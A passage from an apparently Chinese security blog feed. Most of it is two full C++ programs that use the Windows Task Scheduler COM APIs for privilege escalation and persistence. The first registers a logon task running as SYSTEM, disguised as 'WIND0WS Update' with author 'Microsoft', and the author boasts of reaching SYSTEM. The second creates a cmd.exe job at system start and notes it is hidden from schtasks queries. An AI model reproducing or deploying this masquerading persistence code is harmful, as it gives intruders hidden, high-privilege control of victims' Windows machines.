class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,</span><br><span class="line">        RPC_C_IMP_LEVEL_IMPERSONATE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    LPCWSTR wszTaskName = <span class="string">L"WIND0WS Update"</span>; <span class="comment">//设置计划任务名称</span></span><br><span class="line">    <span class="comment">//创建ITaskService的实例</span></span><br><span class="line">    ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line">    hr = CoCreateInstance(CLSID_TaskScheduler,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        CLSCTX_INPROC_SERVER,</span><br><span class="line">        IID_ITaskService,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pService);</span><br><span class="line">    <span class="comment">// 链接到任务实例</span></span><br><span class="line">    hr = pService-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(),</span><br><span class="line">        <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line">    <span class="comment">//     获取指向根任务文件夹的指针。</span></span><br><span class="line">    ITaskFolder* pRootFolder = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">L"\\"</span>), &amp;pRootFolder);</span><br><span class="line">    <span class="comment">//  如果存在相同的任务删除该任务</span></span><br><span class="line">    pRootFolder-&gt;DeleteTask(<span class="keyword">_bstr_t</span>(wszTaskName), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//  创建任务生成器对象以创建任务。</span></span><br><span class="line">    ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;NewTask(<span class="number">0</span>, &amp;pTask);</span><br><span class="line">    pService-&gt;Release();  <span class="comment">//清理Com</span></span><br><span class="line">    <span class="comment">// 获取注册信息</span></span><br><span class="line">    IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line">    hr = pRegInfo-&gt;put_Author((<span class="keyword">_bstr_t</span>)<span class="string">"Microsoft"</span>);                                <span class="comment">// 修改你想要改的计划任务创建者</span></span><br><span class="line">    <span class="comment">//  创建计划任务设置</span></span><br><span class="line">    ITaskSettings* pSettings = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Settings(&amp;pSettings);</span><br><span class="line">    <span class="comment">//      设置任务的设置值</span></span><br><span class="line">    hr = pSettings-&gt;put_StartWhenAvailable(VARIANT_TRUE);</span><br><span class="line">    pSettings-&gt;Release();</span><br><span class="line">    <span class="comment">//  ------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//  获取取触发器集合以插入登录触发器。</span></span><br><span class="line">    ITriggerCollection* pTriggerCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Triggers(&amp;pTriggerCollection);</span><br><span class="line">    <span class="comment">//  添加触发器</span></span><br><span class="line">    ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTriggerCollection-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);   <span class="comment">//TASK_TRIGGER_EVENT    事件触发</span></span><br><span class="line">    pTriggerCollection-&gt;Release();</span><br><span class="line">    ILogonTrigger* pLogonTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTrigger-&gt;QueryInterface(</span><br><span class="line">        IID_ILogonTrigger, (<span class="keyword">void</span>**)&amp;pLogonTrigger);</span><br><span class="line">    pTrigger-&gt;Release();</span><br><span class="line">    hr = pLogonTrigger-&gt;put_Id(<span class="keyword">_bstr_t</span>(<span class="string">L"Trigger1"</span>));</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //设置指定触发时间 如果不设置 代表任何时间都可以触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_StartBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_EndBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //  定义某个用户 登录时触发 注释掉代表所有用户登录后触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_UserId( _bstr_t( L"administrator" ) );   //某用户登录后触发 设置某用户</span></span><br><span class="line"><span class="comment">    pLogonTrigger-&gt;Release();</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    IActionCollection* pActionCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Actions(&amp;pActionCollection);</span><br><span class="line">    IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pActionCollection-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); <span class="comment">//触发程序执行：TASK_ACTION_EXEC</span></span><br><span class="line">    IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pAction-&gt;QueryInterface(</span><br><span class="line">        IID_IExecAction, (<span class="keyword">void</span>**)&amp;pExecAction);</span><br><span class="line">    <span class="built_in">string</span> cmdName;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"输入文件位置：\n"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; cmdName;</span><br><span class="line">    hr = pExecAction-&gt;put_Path(<span class="keyword">_bstr_t</span>(cmdName.c_str()));</span><br><span class="line">    pExecAction-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" 无法设置程序执行路径: %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pRootFolder-&gt;RegisterTaskDefinition(</span><br><span class="line">        <span class="keyword">_bstr_t</span>(wszTaskName),</span><br><span class="line">        pTask,</span><br><span class="line">        TASK_CREATE_OR_UPDATE,  <span class="comment">// 创建并覆盖现有的计划任务：TASK_CREATE_OR_UPDATE </span></span><br><span class="line">                                                        <span class="comment">//仅更新：TASK_UPDATE</span></span><br><span class="line">                                                        <span class="comment">//仅创建：TASK_CREATE</span></span><br><span class="line">                                                        <span class="comment">//禁用：TASK_DISABLE</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L"system"</span>),  <span class="comment">// 启动身份 system 或者administrator </span></span><br><span class="line">        <span class="keyword">_variant_t</span>(),</span><br><span class="line">        TASK_LOGON_GROUP, <span class="comment">//登录技术  组激活：TASK_LOGON_GROUP 用户登录后激活：TASK_LOGON_INTERACTIVE_TOKEN</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L""</span>),</span><br><span class="line">        &amp;pRegisteredTask);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n无法保存计划任务 : %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Success！成功注册计划任务 "</span>);</span><br><span class="line">    pRootFolder-&gt;Release();</span><br><span class="line">    pTask-&gt;Release();</span><br><span class="line">    pRegisteredTask-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，把绝对路径输入后，成功提权至system,非常的爽</p><p><img src="/cmd.jpg"></p><p><img src="/jhrw.jpg"></p><p><img src="/cs.png" alt="cs"></p><h1 id="C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）"><a href="#C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）" class="headerlink" title="C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）"></a>C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）</h1><h3 id="注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。"><a href="#注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。" class="headerlink" title="注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。"></a>注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。</h3><h3 id="使用-Task-Scheduler-1-0-的几个注意点："><a href="#使用-Task-Scheduler-1-0-的几个注意点：" class="headerlink" title="使用 Task Scheduler 1.0 的几个注意点："></a>使用 Task Scheduler 1.0 的几个注意点：</h3><ul><li>创建计划任务需要管理员权限。</li><li>必须确保 Task Scheduler service 正在运行。</li><li>通过 COM 组件创建的计划任务,会在C:\windows\Tasks目录下创建一个同名的 JOB 文件。</li><li>同时需要为计划任务指定一个唯一的名称，如果指定的名称已被使用，则会导致任务创建失败。</li><li>该计划任务无法通过 schtasks 命令查询。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initguid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ole2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstask.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;msterr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;objidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WGetUserName</span><span class="params">(WCHAR* username, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取并显示计算机的名称。</span></span><br><span class="line">    <span class="keyword">char</span>   szName[<span class="number">255</span>];</span><br><span class="line">    ULONG   nLen = <span class="keyword">sizeof</span>(szName);</span><br><span class="line">    ::GetUserNameA(szName, &amp;nLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(szName); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        username[i] = szName[i];</span><br><span class="line">    &#125;</span><br><span class="line">    username[<span class="built_in">strlen</span>(szName)] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, szName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr = S_OK;</span><br><span class="line">    ITaskScheduler* pITS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用CoInitialize初始化COM库，然后  </span></span><br><span class="line">    <span class="comment">//调用CoCreateInstance获取Task Scheduler对象。  </span></span><br><span class="line">    hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (SUCCEEDED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        hr = CoCreateInstance(CLSID_CTaskScheduler,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            CLSCTX_INPROC_SERVER,</span><br><span class="line">            IID_ITaskScheduler,</span><br><span class="line">            (<span class="keyword">void</span>**)&amp;pITS);</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            CoUninitialize();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 获取计算机的用户名</span></span><br><span class="line">    WCHAR username[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(username, <span class="number">0</span>, <span class="keyword">sizeof</span>(username));</span><br><span class="line">    WGetUserName(username, <span class="keyword">sizeof</span>(username));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskScheduler::NewWorkItem创建新任务。  </span></span><br><span class="line">    WCHAR pwszTaskName[<span class="number">512</span>] = <span class="string">L"Test_Task"</span>;</span><br><span class="line">    ITask* pITask;</span><br><span class="line"></span><br><span class="line">    wcscat(pwszTaskName, username);</span><br><span class="line">    hr = pITS-&gt;NewWorkItem(pwszTaskName,         <span class="comment">// 任务名称</span></span><br><span class="line">        CLSID_CTask,          <span class="comment">// 类标识符</span></span><br><span class="line">        IID_ITask,            <span class="comment">// 接口标识符</span></span><br><span class="line">        (IUnknown**)&amp;pITask); <span class="comment">// 解决的任务</span></span><br><span class="line">    <span class="comment">//    接口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pITS-&gt;Release();          <span class="comment">// 释放对象</span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed calling NewWorkItem, error = 0x%x\n"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用ITask::SetApplicationName指定应用程序的名称</span></span><br><span class="line">    <span class="comment">//测试任务。</span></span><br><span class="line">    LPCWSTR pwszApplicationName = <span class="string">L"C:\\Windows\\System32\\cmd.exe "</span>;</span><br><span class="line">    hr = pITask-&gt;SetApplicationName(pwszApplicationName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set flag仅在登录时设置</span></span><br><span class="line">        hr = pITask-&gt;SetFlags(TASK_FLAG_RUN_ONLY_IF_LOGGED_ON);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::EditWorkItem, "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅为登录设置用户名</span></span><br><span class="line">    hr = pITask-&gt;SetAccountInformation(<span class="string">L"Administrator"</span>, <span class="literal">NULL</span>); <span class="comment">//L"NT AUTHORITY\\SYSTEM"; </span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITask::CreateTrigger来创建一个新的触发器。</span></span><br><span class="line">    ITaskTrigger* pITaskTrigger;</span><br><span class="line">    WORD piNewTrigger;</span><br><span class="line">    hr = pITask-&gt;CreateTrigger(&amp;piNewTrigger,</span><br><span class="line">        &amp;pITaskTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::CreatTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义TASK_TRIGGER结构。注意,wBeginDay,</span></span><br><span class="line">    <span class="comment">//wBeginMonth和wBeginYear必须设置为一个有效的</span></span><br><span class="line">    <span class="comment">//分别为日、月、年。</span></span><br><span class="line">    TASK_TRIGGER pTrigger;</span><br><span class="line">    ZeroMemory(&amp;pTrigger, <span class="keyword">sizeof</span>(TASK_TRIGGER));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加代码设置触发器结构?</span></span><br><span class="line">    pTrigger.cbTriggerSize = <span class="keyword">sizeof</span>(TASK_TRIGGER);</span><br><span class="line">    pTrigger.wBeginDay = <span class="number">20</span>;                  <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginMonth = <span class="number">1</span>;                <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wBeginYear = <span class="number">1997</span>;              <span class="comment">// 必需的</span></span><br><span class="line">    pTrigger.wStartHour = <span class="number">10</span>;</span><br><span class="line">    pTrigger.wStartMinute = <span class="number">10</span>;</span><br><span class="line">    pTrigger.MinutesDuration = <span class="number">600</span>;</span><br><span class="line">    pTrigger.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;   <span class="comment">//TASK_EVENT_TRIGGER_AT_SYSTEMSTART   </span></span><br><span class="line">    pTrigger.Type.Daily.DaysInterval = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskTrigger::SetTrigger来设置触发条件。  </span></span><br><span class="line">    hr = pITaskTrigger-&gt;SetTrigger(&amp;pTrigger);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITaskTrigger::SetTrigger: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用IPersistFile::Save将触发器保存到磁盘。  </span></span><br><span class="line">    IPersistFile* pIPersistFile;</span><br><span class="line">    hr = pITask-&gt;QueryInterface(IID_IPersistFile,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pIPersistFile);</span><br><span class="line">    hr = pIPersistFile-&gt;Save(<span class="literal">NULL</span>,</span><br><span class="line">        TRUE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling IPersistFile::Save: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        pITaskTrigger-&gt;Release();</span><br><span class="line">        pIPersistFile-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wprintf(<span class="string">L"The trigger was created and IPersistFile::Save was \n"</span>);</span><br><span class="line">    wprintf(<span class="string">L"called to save the new trigger to disk.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放资源。</span></span><br><span class="line">    pITask-&gt;Release();</span><br><span class="line">    pITaskTrigger-&gt;Release();</span><br><span class="line">    pIPersistFile-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Created task.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>运行后生成job文件</p></blockquote><p><img src="/job.jpg" alt="生成的job文件"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/10625?page=1" target="_blank" rel="noopener">关于计划任务的探究</a></p><p><a href="https://blog.csdn.net/yaoxuanzhi/article/details/57562955?ops_request_misc=&request_id=&biz_id=102&utm_term=C++%20Task%20Scheduler%202.0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-57562955.first_rank_v2_pc_rank_v29&spm=1018.2226.3001.4187" target="_blank" rel="noopener">Task Scheduler 2.0的相关操作</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-2-0-interfaces?redirectedfrom=MSDN" target="_blank" rel="noopener">任务计划程序 2.0 接口</a></p><p><a href="https://www.cnblogs.com/hrhguanli/p/4095448.html" target="_blank" rel="noopener">计划任务中使用NT AUTHORITY\SYSTEM用户和普通管理员用户有什么差别</a></p><p><a href="https://docs.microsoft.com/en-us/windows/win32/taskschd/tasks" target="_blank" rel="noopener">Tasks</a></p><p><a href="https://blog.csdn.net/chantsky/article/details/82904942?spm=1001.2101.3001.6650.5&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-5.pc_relevant_default&utm_relevant_index=10" target="_blank" rel="noopener">VC++创建计划任务的若干方式</a></p>]]></content>
      
      
      <categories>
          
          <category> win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信pc公众号及微信小程序抓取数据包</title>
      <link href="/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/"/>
      <url>/2021/11/22/%E5%BE%AE%E4%BF%A1pc%E5%85%AC%E4%BC%97%E5%8F%B7%E5%8F%8A%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85/</url>
      
